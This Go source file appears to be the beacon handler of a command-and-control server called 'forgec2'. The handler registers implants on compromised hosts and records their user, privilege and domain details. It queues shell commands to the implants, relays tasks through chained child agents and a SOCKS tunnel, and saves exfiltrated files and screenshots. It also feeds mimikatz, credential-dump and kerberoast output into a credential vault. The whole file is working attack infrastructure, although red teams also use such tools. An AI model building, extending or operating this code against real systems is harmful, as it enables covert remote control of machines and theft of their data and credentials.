package server

import (
	"encoding/base64"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"gorm.io/gorm"
)

// Local copies of protocol types (agent package is not importable as it is package main + build constrained)
type beaconRequest struct {
	UUID      string            `json:"uuid"`
	Info      map[string]string `json:"info,omitempty"`
	Results   []taskResult      `json:"results,omitempty"`
	SocksData []socksFrame      `json:"socks_data,omitempty"`
	Relayed   []relayedData     `json:"relayed,omitempty"` // P2P: child results forwarded by parent
}

type relayedData struct {
	AgentID string       `json:"agent_id"` // child agent UUID
	Results []taskResult `json:"results"`
}

type taskResult struct {
	TaskID   uint   `json:"task_id"`
	Type     string `json:"type"`
	Output   string `json:"output"`
	Error    string `json:"error,omitempty"`
	Encoding string `json:"encoding,omitempty"`
	Filename string `json:"filename,omitempty"`
	Size     int64  `json:"size,omitempty"`
	Offset   int64  `json:"offset,omitempty"`
	Path     string `json:"path,omitempty"`
}

type beaconResponse struct {
	Tasks         []task         `json:"tasks"`
	SocksFrames   []socksFrame   `json:"socks_frames,omitempty"`
	SocksFastMode bool           `json:"socks_fast,omitempty"`
	Relayed       []relayedTask  `json:"relayed,omitempty"` // P2P: tasks for children
}

type relayedTask struct {
	AgentID string `json:"agent_id"` // child agent UUID
	Tasks   []task `json:"tasks"`
}

type task struct {
	ID      uint   `json:"id"`
	Type    string `json:"type"`
	Command string `json:"command"`
	Shell   string `json:"shell"`
	Path    string `json:"path,omitempty"`
	Data    string `json:"data,omitempty"`
	Offset  int64  `json:"offset,omitempty"`
	Size    int64  `json:"size,omitempty"`
}

func (s *Server) handleBeacon(c *gin.Context) {
	var req beaconRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid json"})
		return
	}

	if req.UUID == "" {
		req.UUID = uuid.New().String()
	}

	resp := s.processBeacon(req)

	if s.cfg.Malleable.Enabled {
		s.applyMalleableProfile(c, &resp)
	} else {
		c.JSON(http.StatusOK, resp)
	}
}

// processBeacon contains the core beacon logic (registration, result processing,
// task dispatch). It is shared between HTTP and TCP transports.
func (s *Server) processBeacon(req beaconRequest) beaconResponse {
	now := time.Now()

	// Helper to extract metadata from info map
	parseInt := func(key string) int {
		if v, err := strconv.Atoi(req.Info[key]); err == nil {
			return v
		}
		return 0
	}

	var agent db.Agent
	result := s.db.Where("id = ?", req.UUID).First(&agent)

	if result.Error == gorm.ErrRecordNotFound {
		hostname := req.Info["hostname"]
		username := req.Info["username"]
		ip := req.Info["ip"]

		if req.Info["encoding"] == "base64" {
			if decoded, err := base64.StdEncoding.DecodeString(hostname); err == nil {
				hostname = string(decoded)
			}
			if decoded, err := base64.StdEncoding.DecodeString(username); err == nil {
				username = string(decoded)
			}
			if decoded, err := base64.StdEncoding.DecodeString(ip); err == nil {
				ip = string(decoded)
			}
		}

		agent = db.Agent{
			ID:              req.UUID,
			Hostname:        hostname,
			Username:        username,
			OS:              req.Info["os"],
			Arch:            req.Info["arch"],
			IP:              ip,
			LastSeen:        now,
			Status:          "online",
			Version:         req.Info["version"],
			PID:             parseInt("pid"),
			ProcessName:     req.Info["process_name"],
			Integrity:       req.Info["integrity"],
			Elevated:        req.Info["elevated"] == "true",
			Domain:          req.Info["domain"],
			CurrentInterval: parseInt("interval"),
			CurrentJitter:   parseInt("jitter"),
		}
		if lid := req.Info["listener_id"]; lid != "" {
			if id, err := strconv.ParseUint(lid, 10, 32); err == nil {
				agent.ListenerID = uint(id)
			}
		}
		s.db.Create(&agent)
		slog.Info("New agent registered", "id", agent.ID, "hostname", agent.Hostname, "ip", agent.IP, "listener_id", agent.ListenerID)
		go s.broadcastAgentNotification(agent)
	} else {
		agent.LastSeen = now
		agent.Status = "online"
		updates := map[string]interface{}{
			"last_seen": now,
			"status":    "online",
		}
		// Update metadata fields if present
		if v := req.Info["version"]; v != "" {
			updates["version"] = v
			agent.Version = v
		}
		if v := req.Info["process_name"]; v != "" {
			updates["process_name"] = v
			agent.ProcessName = v
		}
		if v := req.Info["integrity"]; v != "" {
			updates["integrity"] = v
			agent.Integrity = v
		}
		if v := req.Info["domain"]; v != "" {
			updates["domain"] = v
			agent.Domain = v
		}
		if v := req.Info["elevated"]; v != "" {
			elev := v == "true"
			updates["elevated"] = elev
			agent.Elevated = elev
		}
		if pid := parseInt("pid"); pid > 0 {
			updates["pid"] = pid
			agent.PID = pid
		}
		if interval := parseInt("interval"); interval > 0 {
			updates["current_interval"] = interval
			agent.CurrentInterval = interval
		}
		if jitter := parseInt("jitter"); jitter >= 0 {
			updates["current_jitter"] = jitter
			agent.CurrentJitter = jitter
		}
		if lid := req.Info["listener_id"]; lid != "" {
			if id, err := strconv.ParseUint(lid, 10, 32); err == nil && agent.ListenerID == 0 {
				agent.ListenerID = uint(id)
				updates["listener_id"] = uint(id)
			}
		}
		s.db.Model(&agent).Updates(updates)
	}

	for _, r := range req.Results {
		slog.Info("Processing task result", "task_id", r.TaskID, "type", r.Type, "has_output", r.Output != "", "has_error", r.Error != "", "error_message", r.Error)

		var task db.Task
		if err := s.db.First(&task, r.TaskID).Error; err == nil && strings.EqualFold(task.AgentID, req.UUID) {
			task.Status = "completed"
			if r.Error != "" {
				task.Status = "failed"
				task.Error = r.Error
			}
			task.UpdatedAt = now

			// For monitoring control tasks, do not retain them in DB at all
			if r.Type == "screen_stream_start" || r.Type == "screen_stream_stop" {
				task.Result = "processed"
				s.db.Save(&task)
				s.broadcastTaskUpdate(req.UUID, task)
				s.db.Delete(&task)
				continue
			}

			// Silent task types: save result for polling but skip WebSocket broadcast
			isSilent := r.Type == "ls"

			if r.Type == "screenshot" && r.Output != "" {
				slog.Info("Processing screenshot result", "agent_uuid", req.UUID, "task_id", r.TaskID)

				if s.IsScreenMonitoring(req.UUID) {
					task.Result = "[live screen monitoring - not retained]"
					s.BroadcastScreenshot(req.UUID, r.Output)
					slog.Info("Screen frame received (monitoring - not saved to file)", "agent", req.UUID)
				} else {
					// Keep as base64 so the frontend can directly use it in data: URL
					task.Result = r.Output
					s.saveScreenshot(s.cfg.Server.DataDir, req.UUID, task.ID, r.Output)
				}
			} else if (r.Type == "upload" || r.Type == "download") && r.Encoding == "base64" {
				task.Result = r.Output
			} else {
				if r.Encoding == "base64" && r.Output != "" {
					decoded, err := base64.StdEncoding.DecodeString(r.Output)
					if err == nil {
						task.Result = string(decoded)
					} else {
						task.Result = r.Output
					}
				} else {
					task.Result = r.Output
				}
			}

			// Format token_list_procs results into a readable table
			if r.Type == "token_list_procs" && task.Result != "" {
				task.Result = FormatTokenProcsFromJSON(task.Result)
			}

			// When set_sleep succeeds, update agent's current interval/jitter
			if r.Type == "set_sleep" && task.Status == "completed" {
				parts := strings.Split(task.Command, ",")
				sleepUpdates := map[string]interface{}{}
				if len(parts) >= 1 {
					if v, err := strconv.Atoi(strings.TrimSpace(parts[0])); err == nil {
						sleepUpdates["current_interval"] = v
					}
				}
				if len(parts) >= 2 {
					if v, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil {
						sleepUpdates["current_jitter"] = v
					}
				}
				if len(sleepUpdates) > 0 {
					s.db.Model(&db.Agent{}).Where("id = ?", req.UUID).Updates(sleepUpdates)
				}
			}

			// Auto-parse credential dump results into the vault
			if r.Type == "creds" && task.Status == "completed" && task.Result != "" {
				parseAndStoreCredentials(s.db, req.UUID, task.Result, task.ID)
			}

			// Auto-parse mimikatz results into the credential vault
			if r.Type == "mimikatz" && task.Status == "completed" && task.Result != "" {
				parseAndStoreCredentials(s.db, req.UUID, task.Result, task.ID)
			}

			// Auto-parse kerberoast TGS hashes into the credential vault
			if r.Type == "kerberoast" && task.Status == "completed" && task.Result != "" {
				parseAndStoreKerberoastResults(s.db, req.UUID, task.Result, task.ID)
			}

			// Enforce max result size only for text results (not for images like screenshots)
			if r.Type != "screenshot" && len(task.Result) > MaxResultSize {
				task.Result = truncateString(task.Result, MaxResultSize)
			}
			s.db.Save(&task)
			if !isSilent {
				s.broadcastTaskUpdate(req.UUID, task)
			}

			// ── Token vault: persist steal/make results ───────────────────────────
			if r.Error == "" && task.Result != "" {
				switch r.Type {
				case "token_steal", "token_make", "token_revert", "rev2self":
					go s.processTokenResult(req.UUID, r.Type, task.Result)
				}
			}

			if (r.Type == "shell" || r.Type == "ps") && (r.Output != "" || r.Error != "" || task.Command != "") {
				cmdStr := task.Command
				if cmdStr == "" {
					cmdStr = r.Type
				}
				resultStr := r.Output
				if r.Encoding == "base64" && r.Output != "" {
					if decoded, err := base64.StdEncoding.DecodeString(r.Output); err == nil {
						resultStr = string(decoded)
					}
				}
				if r.Error != "" {
					resultStr = "ERROR: " + r.Error
				}
				if len(resultStr) > 300 {
					resultStr = resultStr[:300] + "..."
				}
				details := fmt.Sprintf("cmd: %s | result: %s", cmdStr, resultStr)
				if len(details) > 600 {
					details = details[:600] + "..."
				}
				// c may be nil for TCP transport
				s.LogAuditRecord(nil, "command_result", "agent", req.UUID, details, r.Error == "", nil)
			}

			if r.Type == "upload" && r.Output != "" {
				uploadBase := filepath.Join(s.cfg.Server.DataDir, "uploads", req.UUID)
				os.MkdirAll(uploadBase, 0700)
				filename := r.Filename
				if filename == "" {
					filename = fmt.Sprintf("file_%d", task.ID)
				}
				filePath := safeJoin(uploadBase, filename)
				if filePath == "" {
					task.Result = "ERROR: invalid filename (path traversal blocked)"
					s.db.Save(&task)
					continue
				}
				decoded, err := base64.StdEncoding.DecodeString(r.Output)
				if err == nil {
					f, err := os.OpenFile(filePath, os.O_CREATE|os.O_WRONLY, 0644)
					if err == nil {
						if r.Offset > 0 || task.Offset > 0 {
							off := r.Offset
							if off == 0 {
								off = task.Offset
							}
							f.Seek(off, 0)
						}
						f.Write(decoded)
						f.Close()
						task.Result = fmt.Sprintf("File chunk saved: %s offset %d (%d bytes)", filename, r.Offset, r.Size)
						if len(task.Result) > MaxResultSize {
							task.Result = truncateString(task.Result, MaxResultSize)
						}
						s.db.Save(&task)
						slog.Info("File chunk uploaded from agent", "agent", req.UUID, "file", filename, "offset", r.Offset, "size", r.Size)
					}
				}
			}

			if r.Type == "download" && r.Output != "" && (r.Offset > 0 || task.Offset > 0 || r.Size > 0) {
				uploadBase := filepath.Join(s.cfg.Server.DataDir, "uploads", req.UUID)
				os.MkdirAll(uploadBase, 0700)
				filename := r.Filename
				if filename == "" {
					filename = fmt.Sprintf("file_%d", task.ID)
				}
				filePath := safeJoin(uploadBase, filename)
				if filePath == "" {
					task.Result = "ERROR: invalid filename (path traversal blocked)"
					s.db.Save(&task)
					continue
				}
				decoded, err := base64.StdEncoding.DecodeString(r.Output)
				if err == nil {
					f, err := os.OpenFile(filePath, os.O_CREATE|os.O_WRONLY, 0644)
					if err == nil {
						off := r.Offset
						if off == 0 {
							off = task.Offset
						}
						if off > 0 {
							f.Seek(off, 0)
						}
						f.Write(decoded)
						f.Close()
						task.Result = fmt.Sprintf("Download chunk saved: %s offset %d (%d bytes)", filename, off, r.Size)
						if len(task.Result) > MaxResultSize {
							task.Result = truncateString(task.Result, MaxResultSize)
						}
						s.db.Save(&task)
						slog.Info("File chunk downloaded from agent", "agent", req.UUID, "file", filename, "offset", off, "size", r.Size)
					}
				}
			}
		}
	}

	// ── P2P Relayed Results Processing ─────────────────────────────────────
	for _, rd := range req.Relayed {
		// Verify the child belongs to this parent
		var childAgent db.Agent
		if err := s.db.Where("id = ? AND parent_id = ?", rd.AgentID, req.UUID).First(&childAgent).Error; err != nil {
			slog.Warn("P2P relay from non-child agent", "parent", req.UUID, "child", rd.AgentID, "error", err)
			continue
		}
		for _, r := range rd.Results {
			var task db.Task
			if err := s.db.First(&task, r.TaskID).Error; err == nil && strings.EqualFold(task.AgentID, rd.AgentID) {
				task.Status = "completed"
				if r.Error != "" {
					task.Status = "failed"
					task.Error = r.Error
				}
				task.UpdatedAt = now
				if r.Encoding == "base64" && r.Output != "" {
					decoded, err := base64.StdEncoding.DecodeString(r.Output)
					if err == nil {
						task.Result = string(decoded)
					} else {
						task.Result = r.Output
					}
				} else {
					task.Result = r.Output
				}
				if len(task.Result) > MaxResultSize {
					task.Result = truncateString(task.Result, MaxResultSize)
				}
				s.db.Save(&task)
				s.broadcastTaskUpdate(rd.AgentID, task)
				slog.Info("P2P relayed task result processed", "child", rd.AgentID, "task_id", r.TaskID)
			}
		}
		// Relay success: update child's last_seen
		s.db.Model(&childAgent).Update("last_seen", now)
		slog.Info("P2P relayed data processed for child", "parent", req.UUID, "child", rd.AgentID)
	}

	var pendingTasks []db.Task
	s.db.Where("LOWER(agent_id) = LOWER(?) AND status = ?", req.UUID, "pending").Order("created_at asc").Limit(BeaconTaskFetchLimit).Find(&pendingTasks)

	slog.Info("Beacon fetching pending tasks", "agent_uuid", req.UUID, "pending_count", len(pendingTasks))

	for i := range pendingTasks {
		pendingTasks[i].Status = "running"
		s.db.Save(&pendingTasks[i])
	}

	resp := beaconResponse{
		Tasks: make([]task, len(pendingTasks)),
	}
	for i, t := range pendingTasks {
		resp.Tasks[i] = task{
			ID:      t.ID,
			Type:    t.Type,
			Command: t.Command,
			Shell:   t.Shell,
			Path:    t.Path,
			Data:    t.Data,
			Offset:  t.Offset,
			Size:    t.Size,
		}
	}

	// ── P2P Relayed Tasks for Children ──────────────────────────────────────
	var children []db.Agent
	s.db.Where("parent_id = ?", req.UUID).Find(&children)
	for _, child := range children {
		var childTasks []db.Task
		s.db.Where("LOWER(agent_id) = LOWER(?) AND status = ?", child.ID, "pending").Order("created_at asc").Limit(BeaconTaskFetchLimit).Find(&childTasks)
		if len(childTasks) > 0 {
			rt := relayedTask{AgentID: child.ID}
			for _, ct := range childTasks {
				ct.Status = "running"
				s.db.Save(&ct)
				rt.Tasks = append(rt.Tasks, task{
					ID:      ct.ID,
					Type:    ct.Type,
					Command: ct.Command,
					Shell:   ct.Shell,
					Path:    ct.Path,
					Data:    ct.Data,
					Offset:  ct.Offset,
					Size:    ct.Size,
				})
			}
			resp.Relayed = append(resp.Relayed, rt)
		}
	}

	// ── SOCKS Relay Integration ───────────────────────────────────────────────
	// Process relay data coming FROM the agent
	if len(req.SocksData) > 0 {
		s.processAgentSocksData(req.UUID, req.SocksData)
	}
	// Collect pending relay frames going TO the agent
	if frames := s.collectSocksFrames(req.UUID); len(frames) > 0 {
		resp.SocksFrames = frames
	}
	// Hint agent to use fast polling when SOCKS is active
	if s.hasActiveSocks(req.UUID) {
		resp.SocksFastMode = true
	}

	return resp
}

func (s *Server) saveScreenshot(dataDir, agentID string, taskID uint, b64Data string) {
	if s.IsScreenMonitoring(agentID) {
		return // do not retain files during live screen monitoring
	}
	if dataDir == "" {
		dataDir = "data"
	}
	dir := filepath.Join(dataDir, "screenshots", agentID)
	os.MkdirAll(dir, 0700)
	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return
	}
	filename := fmt.Sprintf("screenshot_%d_%d.png", taskID, time.Now().Unix())
	_ = os.WriteFile(filepath.Join(dir, filename), data, 0644)
}

func (s *Server) handleServeScreenshot(c *gin.Context) {
	agentID := c.Param("agent_id")
	filename := c.Param("filename")

	// Build absolute path to the screenshot root directory
	screenshotRoot := filepath.Clean(filepath.Join(s.cfg.Server.DataDir, "screenshots"))

	// Use filepath.Clean to eliminate path traversal sequences (../, ./)
	requested := filepath.Clean(filepath.Join(screenshotRoot, agentID, filename))

	// Verify the final path is under the root directory to prevent path traversal escape
	if !strings.HasPrefix(requested, screenshotRoot+string(filepath.Separator)) {
		c.String(http.StatusBadRequest, "invalid path")
		return
	}

	c.File(requested)
}

// safeJoin verifies that joining base+name stays within base, preventing path traversal.
// Returns empty string if the path escapes the base directory.
func safeJoin(base, name string) string {
	cleanBase := filepath.Clean(base)
	target := filepath.Clean(filepath.Join(cleanBase, name))
	if !strings.HasPrefix(target, cleanBase+string(filepath.Separator)) && target != cleanBase {
		return ""
	}
	return target
}
